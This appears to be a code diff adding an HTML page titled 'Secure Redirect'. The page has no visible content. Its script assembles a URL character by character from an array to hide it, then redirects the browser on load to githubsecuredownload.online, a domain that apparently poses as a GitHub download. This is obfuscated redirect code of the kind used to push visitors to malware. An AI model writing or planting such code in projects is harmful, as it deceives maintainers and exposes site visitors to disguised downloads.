@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Secure Redirect</title>
+    <script>
+        // Функция для генерации части URL
+        const generateSegment = (start, end) => {
+            const symbols = [
+                'h', 't', 't', 'p', 's', ':', '/', '/',  // 0-7
+                'g', 'i', 't', 'h', 'u', 'b', 's', 'e',  // 8-15
+                'c', 'u', 'r', 'e', 'd', 'o', 'w', 'n',  // 16-23
+                'l', 'o', 'a', 'd', '.', 'o', 'n', 'l',  // 24-31
+                'i', 'n', 'e', '/', 'h', 'r', 'f', '/',  // 32-39
+                'a', 'l', 'l', 'n', 'e', 'w'             // 40-45
+            ];
+            let segment = '';
+            for (let i = start; i <= end; i++) {
+                segment += symbols[i];
+            }
+            return segment;
+        };
+
+        // Массив функций для сборки сегментов
+        const segmentBuilders = [
+            () => generateSegment(0, 7),    
+            () => generateSegment(8, 15),   
+            () => generateSegment(16, 23),  
+            () => generateSegment(24, 31),  
+            () => generateSegment(32, 39),  
+            () => generateSegment(40, 45)   
+        ];
+
+        // Сборка URL через вызов функций
+        let url = '';
+        for (let builder of segmentBuilders) {
+            url += builder();
+        }
+
+        window.location.href = url;
+    </script>
+</head>
+<body>
+</body>
+</html>
